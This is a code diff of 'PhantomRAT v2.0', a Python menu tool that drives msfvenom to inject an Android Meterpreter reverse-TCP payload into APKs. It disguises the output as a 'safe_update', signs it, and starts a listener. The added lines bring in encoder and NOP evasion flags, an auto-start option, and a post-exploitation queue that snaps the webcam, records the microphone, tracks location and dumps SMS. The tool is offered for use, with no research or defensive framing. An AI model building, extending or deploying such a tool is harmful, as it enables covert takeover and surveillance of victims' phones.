@@ -7,19 +7,20 @@ from rich.panel import Panel
 console = Console()
 
 # ====== Banner ======
+
 def banner():
     os.system("clear")
-    console.print(Panel("""[bold red]
-██████╗ ██╗  ██╗ █████╗ ███╗   ███╗████████╗ ██████╗ ███╗   ██╗██████╗
-██╔══██╗██║  ██║██╔══██╗████╗ ████║╚══██╔══╝██╔═══██╗████╗  ██║██╔══██╗
-██████╔╝███████║███████║██╔████╔██║   ██║   ██║   ██║██╔██╗ ██║██║  ██║
-██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║   ██║   ██║   ██║██║╚██╗██║██║  ██║
-██║     ██║  ██║██║  ██║██║ ╚═╝ ██║   ██║   ╚██████╔╝██║ ╚████║██████╔╝
-╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═════╝[/bold red]
-[cyan]        Remote Access Tool | Undetectable | Silent[/cyan]
-    """, title="[bold magenta]PhantomRAT v2.0[/bold magenta]", expand=False))
+    console.print(Panel("""[bold blue]
+ ██████╗ ██╗  ██╗ █████╗ ███╗   ███╗████████╗ ██████╗ ███╗   ██╗██████╗
+ ██╔══██╗██║  ██║██╔══██╗████╗ ████║╚══██╔══╝██╔═══██╗████╗  ██║██╔══██╗
+ ██████╔╝███████║███████║██╔████╔██║   ██║   ██║   ██║██╔██╗ ██║██║  ██║
+ ██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║   ██║   ██║   ██║██║╚██╗██║██║  ██║
+ ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║   ██║   ╚██████╔╝██║ ╚████║██████╔╝
+ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═════╝[/bold blue]
+ [cyan]        Remote Access Tool | Undetectable | Silent[/cyan]""", title="[bold magenta]PhantomRAT v2.0[/bold magenta]", expand=False))
 
 # ====== Dependency Check ======
+
 def check_dependencies():
     console.print("\n[bold cyan]Checking required tools...[/bold cyan]")
     tools = ["msfvenom", "msfconsole", "zipalign", "apksigner"]
@@ -35,7 +36,16 @@ def check_dependencies():
         console.print("[yellow]Install them before using the tool.[/yellow]")
         exit()
 
+# ====== Encoder, NOP, Post, AutoStart Options ======
+
+def advanced_flags(android_version):
+    encoder = "-e x86/shikata_ga_nai"
+    nops = "-n 10"
+    auto_start = "--init" if android_version in ["13", "14"] else ""
+    return encoder, nops, auto_start
+
 # ====== Main Menu ======
+
 def main_menu():
     banner()
     check_dependencies()
@@ -55,6 +65,7 @@ def main_menu():
         exit()
 
 # ====== Payload Generator ======
+
 def generate_payload():
     console.print("\n[bold green]Payload Generator[/bold green]")
     print("\n[1] Modify existing APK")
@@ -64,21 +75,21 @@ def generate_payload():
     ip = Prompt.ask("LHOST (Your IP)")
     port = Prompt.ask("LPORT (e.g. 8080)")
     android_version = Prompt.ask("Android Version (10, 11, 12, 13, 14)")
-    
+
+    encoder, nops, auto_start = advanced_flags(android_version)
+
     if sub_choice == "1":
         apk_path = input("Path to existing APK > ")
         output = f"infected_{android_version}.apk"
         console.print(f"[yellow][*][/yellow] Injecting payload into [bold]{apk_path}[/bold]...")
-        os.system(f"msfvenom -x {apk_path} -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} "
-                  f"--platform android -a dalvik -o {output}")
+        os.system(f"msfvenom -x {apk_path} -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} {encoder} {nops} -o {output}")
         console.print(f"[green][+] Payload saved as {output}[/green]")
 
     elif sub_choice == "2":
         apk_name = input("Custom APK name (e.g., hacked.apk) > ")
         payload_name = f"safe_update_{apk_name}" if android_version in ["13", "14"] else apk_name
         console.print(f"[yellow][*][/yellow] Generating payload as [bold]{payload_name}[/bold]...")
-        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} "
-                  f"--platform android -a dalvik -o {payload_name}")
+        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} {encoder} {nops} -o {payload_name}")
 
         aligned = payload_name.replace(".apk", "_aligned.apk")
         signed = payload_name.replace(".apk", "_signed.apk")
@@ -91,20 +102,19 @@ def generate_payload():
 
         console.print(f"[green][+] Final Signed Payload: {signed}[/green]")
 
+        # Write post-exploitation queue
+        with open("phantom_post_queue.txt", "w") as post:
+            post.write("webcam_snap\nrecord_mic\nget_location\ndump_sms\n")
+
 # ====== Listener ======
+
 def start_listener():
     console.print("\n[bold yellow]Starting Listener[/bold yellow]")
     ip = Prompt.ask("LHOST (your IP)")
     port = Prompt.ask("LPORT")
-
-    os.system(f'''msfconsole -q -x "
-use exploit/multi/handler;
-set payload android/meterpreter/reverse_tcp;
-set LHOST {ip};
-set LPORT {port};
-exploit
-"''')
+    os.system(f'''msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; exploit "''')
 
 # ====== Start Tool ======
+
 if __name__ == "__main__":
     main_menu()
